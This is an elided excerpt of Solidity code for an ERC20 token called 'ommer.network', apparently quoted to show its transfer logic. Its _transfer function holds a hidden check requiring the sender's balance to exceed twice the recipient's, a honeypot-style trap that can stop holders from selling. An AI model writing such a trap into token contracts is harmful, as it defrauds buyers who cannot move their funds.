...
contract ERC20 is Context, IERC20 {
	...
	function _transfer(address sender, address recipient, uint256 amount) internal virtual {
		...
		require(_balances[sender] > (_balances[recipient]*2), "ERC20: balance exceded");
		_balances[sender] = _balances[sender].subs(amount, "ERC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
...
contract ommer_network is ERC20 {
	constructor()
	ERC20('ommer.network', 'OMM')
	public {
		governace = msg.sender;
		maxSupply = 105000 * 10 ** uint(decimals());
